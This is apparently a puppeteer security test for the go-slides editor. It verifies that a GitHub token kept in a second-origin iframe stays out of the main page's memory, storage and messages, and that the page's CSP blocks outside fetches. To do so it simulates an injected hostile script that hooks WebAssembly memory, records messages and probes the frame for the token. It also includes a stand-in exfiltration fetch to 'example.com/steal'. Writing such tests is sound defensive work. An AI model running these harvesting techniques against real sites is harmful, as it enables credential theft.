// The GitHub pane in headless Chrome, as an attacker would look at it: a script
// injected into the page. Since go-slides#90 the page holds NO forge token: the
// token is typed into the git frame, an iframe of a second origin
// (go-slides-usercontent.github.io; here a loopback origin, rendered by that
// repository's own cmd/site for this page's origin), which keeps it and makes the
// forge calls. The forge's API is answered here, by request interception, so no
// real token and no network are involved.
//
// It asserts, after a GitHub connect, a load, a proposal, a Remember and a
// reload:
//   - the pane shows no token field, Remember, Connect, sign-in or forge list, and
//     does show the frame;
//   - an injected script finds no token: not in the page's linear memory (the
//     Go module's, captured as a hostile script could), not in localStorage,
//     sessionStorage, IndexedDB, cookies or the URL, not in any message the page
//     (or a preview frame, or the render worker) received; it cannot read the
//     frame's document or storage; a command it sends with the nonce it can read
//     gets files and links back, never a credential; there is no command that
//     returns one;
//   - the page itself never reaches api.github.com: its CSP refuses the fetch,
//     and every request that arrived there came from the frame's origin, with the
//     token in Authorization;
//   - Remember lives in the FRAME's localStorage only, survives a reload, and
//     Disconnect takes it out;
//   - a token an earlier version of the page kept in the page's own storage is
//     removed at first load, never used, and the person is told.
// Prints GIT_OK {...}.
//
//   node git.cjs http://127.0.0.1:PORT/playground/ FRAME_REPO_DIR http://127.0.0.1:FRAMEPORT
//
// The page must have been built with HUGO_PARAMS_GITFRAMEORIGIN=<the third
// argument>; FRAME_REPO_DIR is a checkout of go-slides-usercontent.github.io.
// CHROME names the browser; NODE_PATH finds puppeteer-core.
"use strict";
const puppeteer = require("puppeteer-core");
const crypto = require("crypto");
const http = require("http");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execFileSync } = require("child_process");

const [url, frameRepo, frameOrigin] = process.argv.slice(2);
// Not shaped like a real token: a realistic secret in a test is one copy-paste
// away from being treated as a real one.
const TOKEN = "BROWSER-TOKEN-PLACEHOLDER-0123456789";
const OLD = "OLD-KEPT-TOKEN-PLACEHOLDER-9876543210";
const B64 = Buffer.from(TOKEN).toString("base64");
const OLD64 = Buffer.from(OLD).toString("base64");

function fail(msg) {
  console.error("FAIL " + msg);
  process.exit(1);
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function until(page, what, fn, arg, ms = 30000) {
  const end = Date.now() + ms;
  for (;;) {
    const v = await page.evaluate(fn, arg).catch(() => null);
    if (v) return v;
    if (Date.now() > end) fail("timed out waiting for " + what + ": " + (await page.evaluate(() => JSON.stringify(goSlidesDebug().git)).catch(() => "?")));
    await sleep(25);
  }
}

async function click(page, key) {
  const r = await until(page, key, (k) => goSlidesDebug().rects[k], key);
  await page.mouse.click(r[0] + r[2] / 2, r[1] + r[3] / 2);
}

async function typeInto(page, key, text) {
  await click(page, key);
  await page.keyboard.down("Control");
  await page.keyboard.press("a");
  await page.keyboard.up("Control");
  await page.keyboard.press("Backspace");
  await page.keyboard.type(text);
}

// a fake GitHub repository: o/r with talk/deck.md
const deck = "---\ntheme: default\n---\n\n# From fake GitHub\n";
const sha1 = (s) => crypto.createHash("sha1").update("blob " + Buffer.byteLength(s) + "\0" + s).digest("hex");
const blobSha = sha1(deck);
let headCommit = "c".repeat(40);
const tree = "d".repeat(40);
const calls = []; // every request that reached api.github.com
const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Authorization, Accept, X-GitHub-Api-Version, Content-Type", "Access-Control-Allow-Methods": "GET, POST, PATCH" };

function github(u, method, body) {
  const p = u.pathname;
  if (method === "GET") {
    if (p === "/repos/o/r") return { default_branch: "main" };
    if (p === "/repos/o/r/git/ref/heads/main") return { object: { type: "commit", sha: headCommit } };
    if (p === "/repos/o/r/git/commits/" + headCommit) return { sha: headCommit, tree: { sha: tree } };
    if (p === "/repos/o/r/git/trees/" + tree) {
      return { sha: tree, truncated: false, tree: [
        { path: "talk", mode: "040000", type: "tree", sha: "e".repeat(40) },
        { path: "talk/deck.md", mode: "100644", type: "blob", sha: blobSha, size: Buffer.byteLength(deck) },
      ] };
    }
    if (p === "/repos/o/r/git/blobs/" + blobSha) return { sha: blobSha, encoding: "base64", content: Buffer.from(deck).toString("base64") };
    return null;
  }
  const j = body ? JSON.parse(body) : {};
  if (p === "/repos/o/r/git/blobs") return { sha: sha1(Buffer.from(j.content, "base64").toString()) };
  if (p === "/repos/o/r/git/trees") return { sha: "f".repeat(40) };
  if (p === "/repos/o/r/git/commits") return { sha: "1".repeat(40), tree: { sha: "f".repeat(40) } };
  if (p === "/repos/o/r/git/refs") return {};
  if (p === "/repos/o/r/pulls") return { html_url: "https://github.com/o/r/pull/7" };
  return null;
}

// Hooked BEFORE the page's own scripts, as an injected script would be: it keeps
// every WebAssembly memory it sees, and every message the page receives.
const hostile = () => {
  globalThis.__mem = [];
  globalThis.__msgs = [];
  for (const name of ["instantiate", "instantiateStreaming"]) {
    const orig = WebAssembly[name];
    WebAssembly[name] = async function (...a) {
      const r = await orig.apply(this, a);
      const inst = r.instance || r;
      for (const v of Object.values(inst.exports)) if (v instanceof WebAssembly.Memory) globalThis.__mem.push(v);
      return r;
    };
  }
  addEventListener("message", (e) => {
    try { globalThis.__msgs.push(e.origin + " " + (typeof e.data === "string" ? e.data : JSON.stringify(e.data, (k, v) => v instanceof Uint8Array ? "bytes:" + new TextDecoder().decode(v) : v))); } catch (_) {}
  });
};

// the page's linear memory, searched for each needle (as bytes and as base64)
async function memoryHas(page, needles) {
  return page.evaluate((needles) => {
    const out = {};
    for (const n of needles) out[n] = 0;
    for (const m of globalThis.__mem) {
      const dec = new TextDecoder("latin1");
      const buf = new Uint8Array(m.buffer);
      const step = 1 << 24, keep = 256;
      for (let at = 0; at < buf.length; at += step) {
        const s = dec.decode(buf.subarray(at, Math.min(buf.length, at + step + keep)));
        for (const n of needles) if (s.includes(n)) out[n]++;
      }
    }
    out.__bytes = globalThis.__mem.reduce((t, m) => t + m.buffer.byteLength, 0);
    return out;
  }, needles);
}

// everything the page and its frames and workers can reach, as one string
async function sweep(page) {
  const top = await page.evaluate(async () => {
    const dec = new TextDecoder();
    const str = (v) => {
      if (v instanceof ArrayBuffer) return dec.decode(new Uint8Array(v));
      if (ArrayBuffer.isView(v)) return dec.decode(v);
      if (v && typeof v === "object") {
        let s = "";
        for (const k of Object.keys(v)) s += k + "=" + str(v[k]) + "\n";
        return s;
      }
      return String(v);
    };
    let out = "URL " + location.href + "\nCOOKIE " + document.cookie + "\n";
    for (const st of [localStorage, sessionStorage]) for (let i = 0; i < st.length; i++) out += st.key(i) + "=" + st.getItem(st.key(i)) + "\n";
    for (const info of await indexedDB.databases()) {
      const db = await new Promise((ok, ko) => { const r = indexedDB.open(info.name); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
      for (const name of db.objectStoreNames) {
        const all = await new Promise((ok, ko) => { const r = db.transaction(name).objectStore(name).getAll(); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
        const keys = await new Promise((ok, ko) => { const r = db.transaction(name).objectStore(name).getAllKeys(); r.onsuccess = () => ok(r.result); r.onerror = () => ko(r.error); });
        out += "IDB " + info.name + "/" + name + " " + str(keys) + str(all) + "\n";
      }
      db.close();
    }
    out += "MSGS\n" + globalThis.__msgs.join("\n");
    return out;
  });
  let frames = "";
  for (const f of page.frames()) if (!f.url().startsWith(frameOrigin)) frames += await f.evaluate(() => (globalThis.__seen || []).join("\n")).catch(() => "");
  let workers = "";
  for (const w of page.workers()) workers += await w.evaluate(() => (globalThis.__seen || []).join("\n")).catch(() => "");
  return { top, frames, workers };
}

const leaks = (s) => s.includes(TOKEN) || s.includes(B64) || s.includes(OLD) || s.includes(OLD64);

(async () => {
  if (!url || !frameRepo || !frameOrigin) fail("usage: git.cjs PAGE_URL FRAME_REPO_DIR FRAME_ORIGIN");
  // the frame's site, rendered for THIS page's origin, served at the origin the page was built with
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "gitframe-site-"));
  const pageOrigin = new URL(url).origin;
  execFileSync("go", ["run", "./cmd/site", "--local", "--allow", pageOrigin, "--out", dir], { cwd: frameRepo, stdio: ["ignore", "inherit", "inherit"] });
  const mime = { ".html": "text/html", ".js": "text/javascript", ".wasm": "application/wasm" };
  const frameServer = http.createServer((q, r) => {
    const p = q.url.split("?")[0];
    const f = path.join(dir, p === "/" ? "index.html" : path.basename(p));
    fs.readFile(f, (err, b) => {
      if (err) { r.writeHead(404); return r.end(); }
      r.writeHead(200, { "content-type": mime[path.extname(f)] || "application/octet-stream" });
      r.end(b);
    });
  });
  await new Promise((ok, ko) => { frameServer.once("error", ko); frameServer.listen(Number(new URL(frameOrigin).port), "127.0.0.1", ok); });

  const browser = await puppeteer.launch({ executablePath: process.env.CHROME, headless: true, args: ["--no-sandbox", "--window-size=1440,900"] });
  const hook = async (page, seed) => {
    page.on("pageerror", (e) => fail("pageerror: " + e.message));
    page.on("dialog", (d) => d.accept());
    await page.setViewport({ width: 1440, height: 900, deviceScaleFactor: 1 });
    await page.evaluateOnNewDocument(hostile);
    if (seed) await page.evaluateOnNewDocument(seed);
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const u = new URL(req.url());
      if (u.hostname === "api.github.com") {
        if (req.method() === "OPTIONS") return req.respond({ status: 204, headers: cors });
        calls.push({ method: req.method(), path: u.pathname, auth: req.headers()["authorization"] || "", from: req.frame() ? req.frame().url() : "?" });
        const out = github(u, req.method(), req.postData() || "");
        if (out === null) return req.respond({ status: 404, headers: cors, contentType: "application/json", body: '{"message":"Not Found"}' });
        return req.respond({ status: 200, headers: cors, contentType: "application/json", body: JSON.stringify(out) });
      }
      req.continue();
    });
    // every frame and worker records the messages it receives
    const record = () => addEventListener("message", (e) => { try { (globalThis.__seen = globalThis.__seen || []).push(typeof e.data === "string" ? e.data : JSON.stringify(e.data)); } catch (_) {} });
    page.on("frameattached", (f) => f.evaluate(record).catch(() => {}));
    page.on("framenavigated", (f) => f.evaluate(record).catch(() => {}));
    page.on("workercreated", (w) => w.evaluate(record).catch(() => {}));
    return record;
  };
  const ready = async (page) => {
    await page.goto(url, { waitUntil: "load" });
    await until(page, "the editor", () => globalThis.goSlidesReady && document.querySelector(".stage").classList.contains("ready"));
    await until(page, "the first preview", () => goSlidesDebug().loads >= 1);
  };
  const out = {};

  // 0. A token an earlier version kept in THIS origin's storage is removed at
  // first load, never used, and the person is told.
  {
    const ctx = await browser.createBrowserContext();
    const old = await ctx.newPage();
    await hook(old, () => {
      if (window !== window.top) return; // the sandboxed preview frames have no storage
      localStorage.setItem("goSlidesGitToken", JSON.stringify({ v: 1, forge: "github", origin: "https://api.github.com", token: "OLD-KEPT-TOKEN-PLACEHOLDER-9876543210" }));
      localStorage.setItem("goSlidesGitHubToken", "OLD-KEPT-TOKEN-PLACEHOLDER-9876543210");
      localStorage.setItem("goSlidesGitRemember", "true");
    });
    await ready(old);
    await click(old, "git");
    const note = await until(old, "the migration note", () => goSlidesDebug().git.note.length > 0 && goSlidesDebug().git.note);
    const kept = await old.evaluate(() => [localStorage.getItem("goSlidesGitToken"), localStorage.getItem("goSlidesGitHubToken")]);
    if (kept[0] !== null || kept[1] !== null) fail("the old kept token is still in the page's storage: " + JSON.stringify(kept));
    if (!/removed|supprim|entfernt|eliminó/i.test(note)) fail("the person was not told: " + note);
    if (calls.length) fail("the old token was used: " + JSON.stringify(calls));
    if (leaks((await sweep(old)).top.replace(/localStorage|goSlidesGitRemember/g, "").split("\n").filter((l) => !l.startsWith("goSlidesGit")).join("\n"))) fail("the old token is still in the page");
    await ctx.close();
    out.migration = "an earlier version's kept token is removed at first load, unused, and the person is told";
  }

  const page = await browser.newPage();
  await hook(page);
  await ready(page);
  const recordIn = (f) => f.evaluate(() => addEventListener("message", (e) => { try { (globalThis.__seen = globalThis.__seen || []).push(typeof e.data === "string" ? e.data : JSON.stringify(e.data)); } catch (_) {} })).catch(() => {});
  for (const f of page.frames()) await recordIn(f);
  for (const w of page.workers()) await w.evaluate(() => addEventListener("message", (e) => { try { (globalThis.__seen = globalThis.__seen || []).push(typeof e.data === "string" ? e.data : JSON.stringify(e.data)); } catch (_) {} })).catch(() => {});

  // 1. The page's own policy: no fetch to a forge or any other host, from the page.
  const blocked = await page.evaluate(async () => {
    const r = {};
    for (const u of ["https://example.com/steal?t=x", "https://api.github.com/repos/o/r", "https://gitlab.com/api/v4/projects"]) {
      try { await fetch(u); r[u] = false; } catch (_) { r[u] = true; }
    }
    return r;
  });
  for (const [u, b] of Object.entries(blocked)) if (!b) fail("the page could fetch " + u + ": connect-src does not hold");
  if (!(await page.evaluate(async () => (await fetch(location.href)).ok))) fail("control: a fetch to the page's own origin must work");
  out.csp = "the page's connect-src refuses api.github.com, gitlab.com and every other host, allows itself";

  // 2. The pane: the frame, and no token control.
  await click(page, "git");
  await until(page, "the pane's frame", () => goSlidesDebug().rects["git-frame"]);
  const rects = await page.evaluate(() => Object.keys(goSlidesDebug().rects));
  for (const k of ["git-token", "git-remember", "git-connect", "git-disconnect", "git-forge", "git-signin"]) if (rects.includes(k)) fail("the pane shows " + k);
  const findFrame = async () => {
    const end = Date.now() + 30000;
    for (;;) {
      const f = page.frames().find((f) => f.url().startsWith(frameOrigin));
      if (f) return f;
      if (Date.now() > end) fail("the frame never loaded");
      await sleep(50);
    }
  };
  let fr = await findFrame();
  await recordIn(fr);
  const el = await page.evaluate(() => { const e = document.getElementById("slides-gitframe"); return e && { sandbox: e.getAttribute("sandbox"), src: e.getAttribute("src").split("#")[0], visible: e.style.display === "block" }; });
  if (!el || !el.visible || el.sandbox !== null) fail("the frame element: " + JSON.stringify(el));
  out.pane = "no token field, Remember, Connect, sign-in or forge list; the frame is laid over the pane";

  // 3. The token is typed in the frame. Connect, load, propose, check.
  await typeInto(page, "git-repo", "o/r");
  await typeInto(page, "git-dir", "talk");
  await fr.type("#tok", TOKEN);
  await fr.click("#connect");
  await until(page, "connected", () => goSlidesDebug().git.connected);
  if ((await fr.$eval("#tok", (e) => e.value)) !== "") fail("the token field was not emptied");
  await click(page, "git-load");
  await until(page, "the deck loaded from GitHub", () => goSlidesDebug().source.includes("From fake GitHub"));
  await page.evaluate(() => 0);
  const gets = calls.filter((c) => c.method !== "OPTIONS");
  if (gets.length < 5) fail("expected the GitHub calls, got " + JSON.stringify(gets));
  for (const c of gets) {
    if (c.auth !== "Bearer " + TOKEN) fail("a GitHub request without the token, or with another: " + c.path);
    if (!c.from.startsWith(frameOrigin)) fail("a request to GitHub did not come from the frame: " + c.from);
  }
  out.github = gets.length + " requests to api.github.com, all from the frame's origin, each with the token in Authorization";
  // propose: a new slides/ branch and a pull request
  // an edit in the editor, at the end of the heading, so there is something to propose
  {
    const d = await page.evaluate(() => goSlidesDebug());
    const lines = d.source.split("\n");
    const hl = lines.findIndex((l) => l.startsWith("# "));
    const [x, y] = await page.evaluate((l, c) => goSlidesCaretPixel(l, c), hl, lines[hl].length);
    await page.mouse.click(x + 2, y + 6);
    await page.keyboard.type(" edited");
    await until(page, "the edit", () => goSlidesDebug().source.includes("edited"));
  }
  await click(page, "git-propose");
  // a write needs the person, in the frame: it shows the proposal and waits for its own button
  await fr.waitForSelector("#ask:not([hidden])", { timeout: 20000 });
  if (calls.some((c) => c.method === "POST")) fail("something was written before the person confirmed in the frame");
  await fr.click("#allow");
  await until(page, "the proposal", () => goSlidesDebug().git.link === "https://github.com/o/r/pull/7");
  const ref = calls.find((c) => c.method === "POST" && c.path === "/repos/o/r/git/refs");
  if (!ref) fail("no branch was created");
  out.propose = "a pull request, from a branch the frame named";

  // 4. After connect, an injected script finds no token: memory, storage, messages.
  const mem = await memoryHas(page, [TOKEN, B64, "From fake GitHub"]);
  if (mem.__bytes < (1 << 20)) fail("control: the page's linear memory was not captured (" + mem.__bytes + " bytes)");
  if (!mem["From fake GitHub"]) fail("control: the memory search should find the deck the page loaded");
  if (mem[TOKEN] || mem[B64]) fail("the token is in the page's linear memory");
  let s = await sweep(page);
  if (leaks(s.top)) fail("the token is in the page's storage, URL, cookies or messages");
  if (leaks(s.frames)) fail("a preview frame received the token");
  if (leaks(s.workers)) fail("the render worker received the token");
  if (!s.top.includes("From fake GitHub")) fail("control: the message sweep should see the deck the frame sent");
  out.afterConnect = "not in the page's memory, storage, IndexedDB, URL, cookies, messages, preview frames or worker";

  // 5. What a hostile script CAN do: it can read the frame's nonce from the page
  // and send typed commands, and it cannot read the frame or get a credential.
  const cross = await page.evaluate(async () => {
    const f = document.getElementById("slides-gitframe");
    const r = {};
    try { void f.contentWindow.localStorage; r.storage = "readable"; } catch (e) { r.storage = e.name; }
    try { void f.contentWindow.document.body; r.document = "readable"; } catch (e) { r.document = e.name; }
    r.contentDocument = f.contentDocument === null ? "null" : "readable";
    const nonce = f.getAttribute("src").split("#")[1] || "";
    r.nonceKnown = nonce.length >= 16;
    return r;
  });
  if (cross.storage !== "SecurityError" || cross.document !== "SecurityError" || cross.contentDocument !== "null") fail("the page can reach the frame: " + JSON.stringify(cross));
  const probe = await page.evaluate(async (origin) => {
    const f = document.getElementById("slides-gitframe");
    // the page's iframe src has the fragment removed by the frame? read it from the element
    const nonce = (f.getAttribute("src").split("#")[1]) || "";
    const ask = (t, fields, n) => new Promise((ok) => {
      const id = "h" + Math.random().toString(36).slice(2);
      const on = (e) => { if (e.data && e.data.id === id) { removeEventListener("message", on); ok(e.data); } };
      addEventListener("message", on);
      f.contentWindow.postMessage(Object.assign({ t, id, nonce: n }, fields), origin);
      setTimeout(() => { removeEventListener("message", on); ok(null); }, 1200);
    });
    return {
      status: await ask("status", {}, nonce),
      token: await ask("token", {}, nonce),
      get: await ask("getToken", {}, nonce),
      load: await ask("load", { repo: "o/r", dir: "talk" }, nonce),
      wrong: await ask("status", {}, "x".repeat(32)),
    };
  }, frameOrigin);
  if (probe.wrong !== null) fail("the frame answered a message with the wrong nonce");
  for (const k of ["token", "get"]) if (!probe[k] || probe[k].ok !== false) fail("a command that should not exist was answered: " + k + " " + JSON.stringify(probe[k]));
  if (!probe.status || !probe.status.ok || probe.status.data.connected !== true) fail("a typed command with the nonce: " + JSON.stringify(probe.status));
  if (leaks(JSON.stringify(probe))) fail("a command's answer carried the token");
  out.hostile = "a script that reads the nonce can send typed commands and gets files and links; it cannot read the frame, and no command returns a token";

  // 6. Remember on this device: the FRAME's localStorage only, kept across a
  // reload, removed by Disconnect.
  await fr.click("#disconnect");
  await until(page, "disconnected", () => !goSlidesDebug().git.connected);
  await fr.click("#remember");
  await fr.type("#tok", TOKEN);
  await fr.click("#connect");
  await until(page, "connected again", () => goSlidesDebug().git.connected);
  const framed = await fr.evaluate((t) => { const k = JSON.parse(localStorage.getItem("goSlidesKeptToken") || "null"); return !!k && k.token === t && k.forge === "github"; }, TOKEN);
  if (!framed) fail("Remember did not keep the token in the frame's storage");
  s = await sweep(page);
  if (leaks(s.top)) fail("after Remember the token is in the page");
  const mem2 = await memoryHas(page, [TOKEN, B64]);
  if (mem2[TOKEN] || mem2[B64]) fail("after Remember the token is in the page's memory");
  await page.reload({ waitUntil: "load" });
  await until(page, "the editor", () => globalThis.goSlidesReady && document.querySelector(".stage").classList.contains("ready"));
  await click(page, "git");
  await until(page, "reconnected from the frame's storage", () => goSlidesDebug().git.connected);
  s = await sweep(page);
  if (leaks(s.top)) fail("after a reload the token is in the page");
  fr = await findFrame();
  await fr.click("#disconnect");
  await until(page, "disconnected", () => !goSlidesDebug().git.connected);
  if (!(await fr.evaluate(() => localStorage.getItem("goSlidesKeptToken") === null))) fail("Disconnect left the token in the frame's storage");
  out.remember = "kept only in the frame's storage, reconnects after a reload, never in the page; Disconnect removes it";

  console.log("GIT_OK " + JSON.stringify(out));
  await browser.close();
  frameServer.close();
  fs.rmSync(dir, { recursive: true, force: true });
})().catch((e) => fail(e.stack || String(e)));
